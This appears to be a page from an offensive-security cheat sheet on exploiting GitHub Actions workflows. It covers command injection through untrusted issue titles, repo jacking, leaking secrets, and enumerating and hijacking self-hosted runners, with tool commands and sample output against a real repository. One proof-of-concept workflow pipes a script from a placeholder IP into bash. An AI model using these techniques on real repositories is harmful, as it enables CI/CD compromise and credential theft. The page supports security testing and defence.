# GitHub Actions

## Default Action

The configuration files for GH actions are located in the directory `.github/workflows/`\
You can tell if the action builds pull requests based on its trigger (`on`) instructions:

```yaml
on:
  push:
    branches:
      - master
  pull_request:
```

In order to run a command in an action that builds pull requests, add a `run` instruction to it.

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Command execution
    steps:
    - run: echo whoami"
```


## Misconfigured Actions

Analyze repositories to find misconfigured Github actions.

* [synacktiv/octoscan](https://github.com/synacktiv/octoscan) - Octoscan is a static vulnerability scanner for GitHub action workflows.
* [boostsecurityio/poutine](https://github.com/boostsecurityio/poutine) - Poutine is a security scanner that detects misconfigurations and vulnerabilities in the build pipelines of a repository. It supports parsing CI workflows from GitHub Actions and Gitlab CI/CD.
    ```ps1
    # Using Docker
    $ docker run ghcr.io/boostsecurityio/poutine:latest

    # Analyze a local repository
    $ poutine analyze_local .

    # Analyze a remote GitHub repository
    $ poutine -token "$GH_TOKEN" analyze_repo messypoutine/gravy-overflow

    # Analyze all repositories in a GitHub organization
    $ poutine -token "$GH_TOKEN" analyze_org messypoutine

    # Analyze all projects in a self-hosted Gitlab instance
    $ poutine -token "$GL_TOKEN" -scm gitlab -scm-base-uri https://example.com org/repo
    ```


### Repo Jacking

When the action is using a non-existing action, Github username or organization.

```yaml
- uses: non-existing-org/checkout-action
```

> :warning: To protect against repojacking, GitHub employs a security mechanism that disallows the registration of previous repository names with 100 clones in the week before renaming or deleting the owner's account. [The GitHub Actions Worm: Compromising GitHub Repositories Through the Actions Dependency Tree - Asi Greenholts](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/)


### Untrusted Input Evaluation

An action may be vulnerable to command injection if it dynamically evaluates untrusted input as part of its `run` instruction:

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Print issue title
    steps:
    - run: echo "${{github.event.issue.title}}"
```


### Extract Sensitive Variables and Secrets

**Variables** are used for non-sensitive configuration data. They are accessible only by GitHub Actions in the context of this environment by using the variable context.

**Secrets** are encrypted environment variables. They are accessible only by GitHub Actions in the context of this environment by using the secret context. 

```yml
jobs:
  build:
    runs-on: ubuntu-latest
    environment: env
    steps:
      - name: Access Secrets
        env:
            SUPER_SECRET_TOKEN: ${{ secrets.SUPER_SECRET_TOKEN }}
        run: |
            echo SUPER_SECRET_TOKEN=$SUPER_SECRET_TOKEN >> local.properties
```

* [synacktiv/gh-hijack-runner](https://github.com/synacktiv/gh-hijack-runner) - A python script to create a fake GitHub runner and hijack pipeline jobs to leak CI/CD secrets.




## Self-Hosted Runners

A self-hosted runner for GitHub Actions is a machine that you manage and maintain to run workflows from your GitHub repository. Unlike GitHub's own hosted runners, which operate on GitHub's infrastructure, self-hosted runners run on your own infrastructure. This allows for more control over the hardware, operating system, software, and security of the runner environment. 

Scan a public GitHub Organization for Self-Hosted Runners

* [AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X) - Fork of Gato - Gato (Github Attack TOolkit) - Extreme Edition
* [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Actions Pipeline Enumeration and Attack Tool
    ```ps1
    gato -s enumerate -t targetOrg -oJ target_org_gato.json
    ```

There are 2 types of self-hosted runners: non-ephemeral and ephemeral.

* **Ephemeral** runners are short-lived, created to handle a single or limited number of jobs before being terminated. They provide isolation, scalability, and enhanced security since each job runs in a clean environment.
* **Non-ephemeral** runners are long-lived, designed to handle multiple jobs over time. They offer consistency, customization, and can be cost-effective in stable environments where the overhead of provisioning new runners is unnecessary.

Identify the type of self-hosted runner with `gato`:

```ps1
gato e --repository vercel/next.js
[+] The authenticated user is: swisskyrepo
[+] The GitHub Classic PAT has the following scopes: repo, workflow
    - Enumerating: vercel/next.js!
[+] The repository contains a workflow: build_and_deploy.yml that might execute on self-hosted runners!
[+] The repository vercel/next.js contains a previous workflow run that executed on a self-hosted runner!
    - The runner name was: nextjs-hel1-22 and the machine name was nextjs-hel1-22 and the runner type was repository in the Default group with the following labels: self-hosted, linux, x64, metal
[!] The repository contains a non-ephemeral self-hosted runner!
[-] The user can only pull from the repository, but forking is allowed! Only a fork pull-request based attack would be possible.
```

Example of workflow to run on a non-ephemeral runner:

```yml
name: POC
on:
  pull_request:
  
jobs:
  security:
    runs-on: non-ephemeral-runner-name

    steps:
      - name: cmd-exec
        run: |
          curl -k https://ip.ip.ip.ip/exec.sh | bash
```


## References

* [GITHUB ACTIONS EXPLOITATION: SELF HOSTED RUNNERS - Hugo Vincent - 17/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-self-hosted-runners)
* [GITHUB ACTIONS EXPLOITATION: REPO JACKING AND ENVIRONMENT MANIPULATION - Hugo Vincent - 10/07/2024 ](https://www.synacktiv.com/publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)
* [GITHUB ACTIONS EXPLOITATION: DEPENDABOT - Hugo Vincent - 06/08/2024 ](https://www.synacktiv.com/publications/github-actions-exploitation-dependabot)